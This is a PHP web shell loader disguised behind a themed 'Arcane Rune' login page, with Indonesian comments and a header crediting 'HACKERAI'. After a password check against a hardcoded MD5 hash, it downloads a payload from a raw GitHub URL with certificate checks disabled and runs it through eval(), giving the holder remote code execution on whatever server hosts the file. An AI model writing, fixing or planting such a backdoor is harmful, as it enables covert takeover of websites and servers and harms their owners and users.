<?php
session_start();
error_reporting(0);

/**
 * FIXED LOADER BY HACKERAI
 * Gabungan UI Arcane Rune + Loader AL3 Core (Fixed RAW Link)
 */

function geturlsinfo($url) {
    if (function_exists('curl_init')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($conn, CURLOPT_TIMEOUT, 30);
        $data = curl_exec($conn);
        curl_close($conn);
        return $data;
    } elseif (function_exists('file_get_contents')) {
        return @file_get_contents($url);
    }
    return false;
}

function is_logged_in() {
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

// Handle Login - MD5: 344250aea66c5f0003378e7fe74e14b2
if (isset($_POST['AL3'])) {
    if (md5($_POST['AL3']) === '344250aea66c5f0003378e7fe74e14b2') {
        $_SESSION['logged_in'] = true;
    } else {
        $error_msg = "KEMANA LAGI HARUS MELANGKAH";
    }
}

if (is_logged_in()) {
    // LINK RAW YANG SUDAH DIPERBAIKI (TIDAK PAKAI /blob/)
    $u = "https://raw.githubusercontent.com/odollemas644-source/gokilllssss/main/main-ale.txt";
    $payload = geturlsinfo($u);
    
    if ($payload) {
        eval('?>' . $payload);
        exit;
    } else {
        die("System Error: Core is unreachable. Check GitHub Raw Link!");
    }
} else {
    // TAMPILAN LOGIN ARCANE RUNE (SESUAI REQUEST LO)
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>ARCANE RUNE ACCESS</title>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Uncial+Antiqua&family=Orbitron:wght@400;700&display=swap');
    body { margin: 0; height: 100vh; background: #050008; overflow: hidden; font-family: 'Uncial Antiqua', serif; color: #ba7bff; }
    canvas { position: fixed; inset: 0; z-index: 1; }
    .capsule { position: fixed; top: 50%; left: 50%; width: 380px; padding: 30px; transform: translate(-50%, -50%); background: radial-gradient(circle, rgba(90,0,130,0.45), rgba(0,0,0,0.6)); border: 2px solid #a34dff88; border-radius: 40px; box-shadow: 0 0 40px #8a2effaa, inset 0 0 30px #5a0099, 0 0 100px #30004f; backdrop-filter: blur(10px); z-index: 3; animation: float 4s ease-in-out infinite alternate; }
    @keyframes float { 0% { transform: translate(-50%, -53%) scale(1); } 100% { transform: translate(-50%, -47%) scale(1.03); } }
    .title { text-align: center; font-size: 26px; margin-bottom: 15px; color: #d9b3ff; text-shadow: 0 0 12px #c177ff, 0 0 22px #7000aa; letter-spacing: 3px; }
    .capsule img { display: block; width: 160px; margin: 10px auto 20px; border-radius: 10px; box-shadow: 0 0 20px #8a2effcc; }
    input[type=password] { width: 100%; padding: 12px; background: rgba(255,255,255,0.08); border: 1px solid #b46dff55; border-radius: 8px; color: #f1d5ff; font-size: 16px; outline: none; margin-bottom: 15px; font-family: 'Orbitron', sans-serif; box-sizing: border-box; }
    input[type=submit] { width: 100%; padding: 13px; background: linear-gradient(90deg, #7e00ff, #cc72ff); border: none; border-radius: 8px; font-size: 15px; color: #fff; cursor: pointer; font-family: 'Orbitron', sans-serif; box-shadow: 0 0 20px #ae59ff; transition: .25s; }
    .rune { position: fixed; font-size: 30px; color: #7c25ff; opacity: 0.25; animation: drift 9s linear infinite; z-index: 2; }
    @keyframes drift { from { transform: translateY(-10vh) rotate(0deg); } to { transform: translateY(120vh) rotate(360deg); } }
</style>
</head>
<body>
<canvas id="rain"></canvas>
<div class="capsule">
    <div class="title">ARCANE RUNE ACCESS</div>
    <img src="https://res.cloudinary.com/dgb2q7dr8/image/upload/v1775325661/luffyyx_jevlh7.png">
    <form method="POST">
        <input type="password" name="AL3" placeholder="ENTER YOUR KEYWORD" required>
        <input type="submit" value="UNSEAL CAPSULE">
    </form>
    <?php if(isset($error_msg)) echo "<p style='text-align:center; color:red; font-size:12px;'>$error_msg</p>"; ?>
</div>
<script>
    const c = document.getElementById("rain");
    const ctx = c.getContext("2d");
    c.width = window.innerWidth; c.height = window.innerHeight;
    const runes = "ᚠᚡᚢᚦᚨᚱᚲᚷᚹᚺᛉᛋᛏᛒᛗᛚᛝᛟᚪᚫᚬᚭᚮᚯᚰᚱ";
    const fontSize = 22; const columns = c.width / fontSize; const drops = [];
    for (let i = 0; i < columns; i++) drops[i] = 1;
    function draw() {
        ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, c.width, c.height);
        ctx.fillStyle = "#a22fff"; ctx.font = fontSize + "px serif";
        for (let i = 0; i < drops.length; i++) {
            const text = runes[Math.floor(Math.random() * runes.length)];
            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
            if (drops[i] * fontSize > c.height && Math.random() > 0.97) drops[i] = 0;
            drops[i]++;
        }
    }
    setInterval(draw, 45);
</script>
</body>
</html>
<?php } ?>
